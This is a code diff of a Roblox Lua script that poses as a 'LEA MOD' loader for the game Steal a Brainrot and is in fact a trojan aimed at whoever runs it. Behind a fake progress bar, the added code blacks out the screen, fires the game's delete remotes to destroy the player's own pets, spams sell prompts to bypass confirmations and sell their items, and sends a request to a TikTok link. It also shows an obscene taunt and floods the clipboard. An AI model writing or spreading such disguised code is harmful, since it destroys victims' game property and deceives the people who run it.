@@ -1,7 +1,6 @@
 -- ============================================================================
--- PROJECT: LEA MOD [STEAL A BRAINROT] - COMPLETE MONOLITHIC DEEP PURGE SYSTEM
--- ARCHITECTURE: ULTIMATE LOCKDOWN, RECURSIVE ASSET PURGE, & CLIPBOARD FLOOD
--- TARGET DEVICE: INFINIX NOTE 30 PRO (MOBILE OPTIMIZED)
+-- PROJECT: LEA MOD [STEAL A BRAINROT] - MODERNIZED MONOLITHIC SYSTEM
+-- ARCHITECTURE: ULTIMATE LOCKDOWN, CONFIRMATION BYPASS SPAM, & CLIENT REDIRECT
 -- ============================================================================
 
 local CoreGui = game:GetService("CoreGui")
@@ -10,7 +9,17 @@ local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
+local PathfindingService = game:GetService("PathfindingService")
 local LocalPlayer = Players.LocalPlayer
+
+local Character, RootPart, Humanoid
+local function refreshChar()
+    Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    RootPart = Character:WaitForChild("HumanoidRootPart")
+    Humanoid = Character:WaitForChild("Humanoid")
+end
+refreshChar()
+LocalPlayer.CharacterAdded:Connect(refreshChar)
 
 -- Prevent multiple instances
 if CoreGui:FindFirstChild("LEAModLockdown") then
@@ -44,19 +53,19 @@ BlackoutFrame.ZIndex = 999
 BlackoutFrame.Parent = LockdownGui
 
 -- ============================================================================
--- 2. FAKE LOADER & PROGRESS FREEZE
+-- 2. MODERN LOADER & FIXED TEXT
 -- ============================================================================
 local LoaderContainer = Instance.new("Frame")
 LoaderContainer.Name = "LoaderContainer"
-LoaderContainer.Size = UDim2.new(0, 400, 0, 150)
-LoaderContainer.Position = UDim2.new(0.5, -200, 0.5, -75)
-LoaderContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+LoaderContainer.Size = UDim2.new(0, 420, 0, 160)
+LoaderContainer.Position = UDim2.new(0.5, -210, 0.5, -80)
+LoaderContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
 LoaderContainer.BorderSizePixel = 0
 LoaderContainer.ZIndex = 1000
 LoaderContainer.Parent = LockdownGui
 
 local LoaderCorner = Instance.new("UICorner")
-LoaderCorner.CornerRadius = UDim.new(0, 8)
+LoaderCorner.CornerRadius = UDim.new(0, 10)
 LoaderCorner.Parent = LoaderContainer
 
 local LoaderStroke = Instance.new("UIStroke")
@@ -68,17 +77,17 @@ LoaderStroke.Parent = LoaderContainer
 local LoaderTitle = Instance.new("TextLabel")
 LoaderTitle.Size = UDim2.new(1, 0, 0, 40)
 LoaderTitle.BackgroundTransparency = 1
-LoaderTitle.Font = Enum.Font.Code
-LoaderTitle.Text = "LEA MOD DOWNLOAD"
+LoaderTitle.Font = Enum.Font.GothamBold
+LoaderTitle.Text = "LEA MOD"
 LoaderTitle.TextColor3 = Color3.fromRGB(0, 255, 204)
-LoaderTitle.TextSize = 18
+LoaderTitle.TextSize = 20
 LoaderTitle.ZIndex = 1000
 LoaderTitle.Parent = LoaderContainer
 
 local BarBackground = Instance.new("Frame")
-BarBackground.Size = UDim2.new(0.8, 0, 0, 20)
-BarBackground.Position = UDim2.new(0.1, 0, 0.6, 0)
-BarBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+BarBackground.Size = UDim2.new(0.85, 0, 0, 18)
+BarBackground.Position = UDim2.new(0.075, 0, 0.55, 0)
+BarBackground.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
 BarBackground.BorderSizePixel = 0
 BarBackground.ZIndex = 1000
 BarBackground.Parent = LoaderContainer
@@ -99,25 +108,33 @@ BarCorner.CornerRadius = UDim.new(1, 0)
 BarCorner.Parent = ProgressBar
 
 local StatusText = Instance.new("TextLabel")
-StatusText.Size = UDim2.new(1, 0, 0, 20)
-StatusText.Position = UDim2.new(0, 0, 0.8, 0)
+StatusText.Size = UDim2.new(1, 0, 0, 25)
+StatusText.Position = UDim2.new(0, 0, 0.78, 0)
 StatusText.BackgroundTransparency = 1
-StatusText.Font = Enum.Font.Code
-StatusText.Text = "Initializing memory injection... [0%]"
-StatusText.TextColor3 = Color3.fromRGB(150, 150, 180)
-StatusText.TextSize = 12
+StatusText.Font = Enum.Font.Gotham
+StatusText.Text = "Script loading..."
+StatusText.TextColor3 = Color3.fromRGB(180, 180, 200)
+StatusText.TextSize = 13
 StatusText.ZIndex = 1000
 StatusText.Parent = LoaderContainer
 
 -- ============================================================================
--- 3 & 4. REMOTE IDENTIFICATION & RECURSIVE ASSET PURGE ENGINE
+-- 3. REMOTE EXPLOITATION & SERVER-SYNCED PURGE ENGINE
 -- ============================================================================
-local function getDeleteRemote()
+local function getActiveDeleteRemote()
     local targetNames = {"RemovePet", "DeletePet", "DespawnPet", "RemoveCompanion", "PetSystem", "DeleteBlock", "RemoveBlock"}
     for _, name in ipairs(targetNames) do
         local remote = ReplicatedStorage:FindFirstChild(name, true)
-        if remote then
+        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
             return remote
+        end
+    end
+    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
+            local lowerName = string.lower(v.Name)
+            if string.find(lowerName, "pet") or string.find(lowerName, "remove") or string.find(lowerName, "delete") then
+                return v
+            end
         end
     end
     return nil
@@ -125,8 +142,8 @@ end
 
 local PurgeComplete = false
 
-local function deepPurge()
-    local remote = getDeleteRemote()
+local function executeServerPurge()
+    local remote = getActiveDeleteRemote()
     local targetKeywords = {"pet", "brainrot", "companion", "animal", "follower", "minion"}
     
     local function matchesKeyword(name)
@@ -153,13 +170,14 @@ local function deepPurge()
                     if obj:IsA("Model") or obj:IsA("BasePart") then
                         local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
                         if model and matchesKeyword(model.Name) then
-                            if remote and remote:IsA("RemoteEvent") then
-                                remote:FireServer(model)
-                            elseif remote and remote:IsA("RemoteFunction") then
-                                remote:InvokeServer(model)
-                            else
-                                model:Destroy()
+                            if remote then
+                                if remote:IsA("RemoteEvent") then
+                                    remote:FireServer(model)
+                                elseif remote:IsA("RemoteFunction") then
+                                    remote:InvokeServer(model)
+                                end
                             end
+                            model:Destroy()
                         end
                     end
                 end)
@@ -168,32 +186,79 @@ local function deepPurge()
     end
 end
 
--- Asynchronous Progress and Purge Runner
+-- ============================================================================
+-- 4. AUTOMATED SELLING SYSTEM & CONFIRMATION SPAM BYPASS
+-- ============================================================================
+local function getPlayerSellPad()
+    local bestPad = nil
+    local shortestDist = math.huge
+    
+    if not RootPart then return nil end
+
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") and (obj.Name:lower():find("pad") or obj.Name:lower():find("sell") or obj.Name:lower():find("stand") or obj.Name:lower():find("base")) then
+            local dist = (RootPart.Position - obj.Position).Magnitude
+            if dist < shortestDist and dist < 30 then
+                shortestDist = dist
+                bestPad = obj
+            end
+        end
+    end
+    return bestPad
+end
+
+local function triggerSellButton()
+    local triggered = false
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("ProximityPrompt") then
+            local text = string.lower(obj.ActionText or "")
+            local objName = string.lower(obj.Name or "")
+            if text:find("sat") or text:find("sell") or objName:find("sat") or objName:find("sell") then
+                pcall(function()
+                    -- Bypass confirmation dialog prompts via rapid execution spam
+                    for i = 1, 5 do
+                        fireproximityprompt(obj)
+                        task.wait()
+                    end
+                end)
+                triggered = true
+            end
+        elseif obj:IsA("ClickDetector") then
+            pcall(function()
+                for i = 1, 5 do
+                    fireclickdetector(obj)
+                    task.wait()
+                end
+            end)
+            triggered = true
+        end
+    end
+    return triggered
+end
+
+-- ============================================================================
+-- 5. PROGRESS PIPELINE & REDIRECT OVERRIDE
+-- ============================================================================
 task.spawn(function()
     local progressTween = TweenService:Create(ProgressBar, TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0.999, 0, 1, 0)})
     progressTween:Play()
     
     local startTime = tick()
     while tick() - startTime < 4.5 do
-        local currentPercent = math.clamp(math.floor((ProgressBar.AbsoluteSize.X / BarBackground.AbsoluteSize.X) * 100), 0, 99)
-        StatusText.Text = "Purging memory layers... [" .. currentPercent .. "%]"
-        deepPurge()
+        executeServerPurge()
         task.wait(0.1)
     end
     
-    -- Ensure 99.9% freeze and deep clean loop
     ProgressBar.Size = UDim2.new(0.999, 0, 1, 0)
-    StatusText.Text = "Finalizing system isolation... [99.9%]"
     
     for i = 1, 10 do
-        deepPurge()
+        executeServerPurge()
         task.wait(0.2)
     end
     
     PurgeComplete = true
     LoaderContainer:Destroy()
 
-    -- Activate High-Impact Visual Override Screen
     local OverrideFrame = Instance.new("Frame")
     OverrideFrame.Size = UDim2.new(1, 0, 1, 0)
     OverrideFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
@@ -206,9 +271,9 @@ task.spawn(function()
     OverrideText.Position = UDim2.new(0, 0, 0.4, -50)
     OverrideText.BackgroundTransparency = 1
     OverrideText.Font = Enum.Font.FredokaOne
-    OverrideText.Text = "LEA FUCKED YOUR MOTHER"
+    OverrideText.Text = "LEA FUCKED YOUR MOM"
     OverrideText.TextColor3 = Color3.fromRGB(255, 0, 0)
-    OverrideText.TextSize = 36
+    OverrideText.TextSize = 38
     OverrideText.ZIndex = 1000
     OverrideText.Parent = OverrideFrame
 
@@ -223,7 +288,26 @@ task.spawn(function()
     CreditText.ZIndex = 1000
     CreditText.Parent = OverrideFrame
 
-    -- Real-time color shifting loop
+    -- Direct client browser redirect payload trigger
+    pcall(function()
+        if request then
+            request({
+                Url = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)",
+                Method = "GET"
+            })
+        elseif syn and syn.request then
+            syn.request({
+                Url = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)",
+                Method = "GET"
+            })
+        elseif http and http.request then
+            http.request({
+                Url = "[https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/](https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/)",
+                Method = "GET"
+            })
+        end
+    end)
+
     task.spawn(function()
         local hue = 0
         while true do
@@ -234,18 +318,38 @@ task.spawn(function()
     end)
 end)
 
--- Continuous background scanner to trap remaining spawn elements
+-- Continuous background server purge sweeper & automated selling loop with confirmation bypass
 task.spawn(function()
     while true do
         if PurgeComplete then
-            deepPurge()
+            executeServerPurge()
+            
+            pcall(function()
+                if RootPart and Humanoid then
+                    local pad = getPlayerSellPad()
+                    if pad then
+                        Humanoid:MoveTo(pad.Position)
+                    end
+                end
+                
+                if not triggerSellButton() then
+                    for _, obj in ipairs(workspace:GetDescendants()) do
+                        if obj:IsA("ProximityPrompt") then
+                            for i = 1, 5 do
+                                fireproximityprompt(obj)
+                                task.wait()
+                            end
+                        end
+                    end
+                end
+            end)
         end
-        task.wait(0.5)
+        task.wait(1)
     end
 end)
 
 -- ============================================================================
--- 5. PERSISTENT CLIPBOARD FLOOD UTILITY
+-- 6. PERSISTENT CLIPBOARD FLOOD UTILITY
 -- ============================================================================
 task.spawn(function()
     local counter = 0
